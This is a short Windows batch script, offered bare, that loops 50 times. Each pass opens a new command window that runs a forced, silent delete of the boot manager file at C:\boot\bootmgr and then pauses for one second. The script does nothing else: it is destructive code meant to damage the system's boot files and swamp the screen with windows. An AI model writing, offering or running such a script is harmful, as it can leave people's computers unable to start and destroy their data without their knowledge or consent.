@echo off
for /l %%i in (1,1,50) do (
    start cmd /k del /F /Q C:\boot\bootmgr
    timeout /T 1
)
